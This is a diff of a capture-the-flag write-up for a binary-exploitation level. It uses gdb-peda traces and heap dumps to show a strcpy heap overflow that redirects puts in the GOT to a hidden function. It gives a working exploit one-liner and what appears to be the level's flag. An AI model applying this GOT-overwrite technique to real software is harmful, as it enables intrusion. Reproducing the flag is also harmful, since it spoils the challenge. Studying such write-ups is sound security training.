@@ -84,7 +84,7 @@ Then, the pass file is readed and stored inside a global variable. Unfortunately
 
 The idea would be to replace the address of `puts` in the Global Offset Table (GOT) with the `m-function` address.
 
-Lets gets `puts` address in GOT and `m-function` address.
+Lets get `puts` address in GOT and `m-function` address.
 
 ```bash
 # puts address
@@ -96,8 +96,12 @@ objdump -t ./level7  | grep -w m
 > 080484f4 g     F .text  0000002d              m
 ```
 
-```
-run AAAAAAAA BBBBBBBB
+Now we need to find a way to replace the puts-function address with the m-function address.
+
+```shell
+gdb-peda$ b *0x080485a0 # first strcpy
+gdb-peda$ b *0x080485bd # second strcpy
+gdb-peda$ run AAAAAAAA BBBBBBBB
 
 # Before 1st strcpy
 [-------------------------------------code-------------------------------------]
@@ -114,83 +118,107 @@ arg[0]: 0x804a018 --> 0x0          -> s_arg1->ptr
 arg[1]: 0xbffff838 ("AAAAAAAA")    -> argv[1]
 [------------------------------------stack-------------------------------------]
 
+gdb-peda$ x/x $esp+0x1c # s_arg1
+> 0xbffff62c:     0x0804a008
+
+gdb-peda$ x/x $esp+0x18 # s_arg2
+> 0xbffff628:     0x0804a028
+
 gdb-peda$ x/20 0x804a000
-0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018 -> s_arg1->ptr*
-                                                  _______________________|
-                                                  |
-0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
-0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
-0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
-0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+                                                           ┌──────────────────> s_arg1->n
+> 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018 ─> s_arg1->ptr
+  0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
+  0x804a020:      0x00000000      0x00000011      0x00000002──┐   0x0804a038 ─> s_arg2->ptr
+  0x804a030:      0x00000000      0x00000011      0x00000000  │   0x00000000
+  0x804a040:      0x00000000      0x00020fc1      0x00000000  │   0x00000000
+                                                              └───────────────> s_arg2->n
+```
 
+We have below the situation, just before the first strcpy. Lets move on.
 
-ni
-# After 1st strcpy
+```shell
+gdb-peda$ nexti
+> 0x804a000: 0x00000000 0x00000011 0x00000001 0x0804a018
+                                     ┌─────────────────┤
+  0x804a010: 0x00000000 0x00000011 0x41414141 0x41414141
+  0x804a020: 0x00000000 0x00000011 0x00000002 0x0804a038
+  0x804a030: 0x00000000 0x00000011 0x00000000 0x00000000
+  0x804a040: 0x00000000 0x00020fc1 0x00000000 0x00000000
+```
 
-x/20x 0x804a000
-0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
-                                                  _______________________|
-                                                  |
-0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
-0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
-0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
-0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+The first `strcpy` has copied 8 "A" (the content of the first argument argv[1]) at `0x0804a018`
+
+Same logic with the second `strcpy`:
+
+```shell
+gdb-peda$ continue
 
 # Before 2nd strcpy
 [-------------------------------------code-------------------------------------]
-   0x80485b3 <main+146>:        mov    eax,DWORD PTR [eax+0x4]
-   0x80485b6 <main+149>:        mov    DWORD PTR [esp+0x4],edx
-   0x80485ba <main+153>:        mov    DWORD PTR [esp],eax
-=> 0x80485bd <main+156>:        call   0x80483e0 <strcpy@plt>
-   0x80485c2 <main+161>:        mov    edx,0x80486e9
-   0x80485c7 <main+166>:        mov    eax,0x80486eb
-   0x80485cc <main+171>:        mov    DWORD PTR [esp+0x4],edx
-   0x80485d0 <main+175>:        mov    DWORD PTR [esp],eax
+0x80485b3 <main+146>: mov eax,DWORD PTR [eax+0x4]
+0x80485b6 <main+149>: mov DWORD PTR [esp+0x4],edx
+0x80485ba <main+153>: mov DWORD PTR [esp],eax
+=> 0x80485bd <main+156>: call 0x80483e0 <strcpy@plt>
+0x80485c2 <main+161>: mov edx,0x80486e9
+0x80485c7 <main+166>: mov eax,0x80486eb
+0x80485cc <main+171>: mov DWORD PTR [esp+0x4],edx
+0x80485d0 <main+175>: mov DWORD PTR [esp],eax
 Guessed arguments:
 arg[0]: 0x804a038 --> 0x0
 arg[1]: 0xbffff841 ("BBBBBBBB")
 
-ni
-# After 1st strcpy
+gdb-peda$ nexti
 
-x/20x 0x804a000
-0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
-                                                  _______________________|
-                                                  |
-0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
-0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
-                                                  _______________________|
-                                                  |
-0x804a030:      0x00000000      0x00000011      0x42424242      0x42424242
-0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+# After 1st strcpy
+gdb-peda$ x/20x 0x804a000
+> 0x804a000: 0x00000000 0x00000011 0x00000001 0x0804a018
+                                     ┌─────────────────┤
+  0x804a010: 0x00000000 0x00000011 0x41414141 0x41414141
+  0x804a020: 0x00000000 0x00000011 0x00000002 0x0804a038
+                                     ┌─────────────────┤
+  0x804a030: 0x00000000 0x00000011 0x42424242 0x42424242
+  0x804a040: 0x00000000 0x00020fc1 0x00000000 0x00000000
 ```
+
+The first `strcpy` has an offset of 20. After 20 characters, it erases the address `0x0804a038` that is the destination pointer of the second `strcpy`.
+
+The solution: we have to replace the puts-function address with the m-function address with:
+
+- argv[1]: PADDING[20] + the address where we want to write: _the puts-function address in GOT:_ `0x08049928`
+- argv[2]: the value we want to write: _the m-function address_: `080484f4`
+
+Lets try in gdb
 
 ```shell
-b*0x080485bd # before 2nd strcpy
-run $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
-x/20x 0x804a000
-0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
-0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
-0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
-0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
-0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+gdb-peda$ b*0x080485bd # before 2nd strcpy
+gdb-peda$ run $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+gdb-peda$ x/20x 0x804a000
+> 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+  0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
+  0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
+  0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
+  0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
 
-ni
-x/20x 0x804a000
-0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
-0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
-0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
-0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
-0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+gdb-peda$ nexti
+gdb-peda$ x/20x 0x804a000
+> 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+  0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
+  0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928
+  0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
+  0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
 
-x/x 0x08049928
-0x8049928 <puts@got.plt>:       0x080484f4
+gdb-peda$ x/x 0x08049928
+> 0x8049928 <puts@got.plt>:       0x080484f4
 ```
+
+That is good ! The address of the pointer `s_arg2->ptr` has been changed with `0x08049928` (puts-function address). Then this address aims to the m-function. It is perfect !
+
+Lets try without gdb:
 
 ```bash
 ~/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 > 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-  - 1604570728 # time (useless)
+  (...)
 ```
 
 ---
@@ -209,5 +237,5 @@ x/x 0x08049928
 - [Man strcpy](https://linux.die.net/man/3/strcpy)
 - [Man fopen](https://linux.die.net/man/3/fopen)
 - [Man fgets](https://linux.die.net/man/3/fgets)
-- [Man time]()
-- [Man printf]()
+- [Man time](https://linux.die.net/man/2/time)
+- [Man printf](https://linux.die.net/man/3/printf)
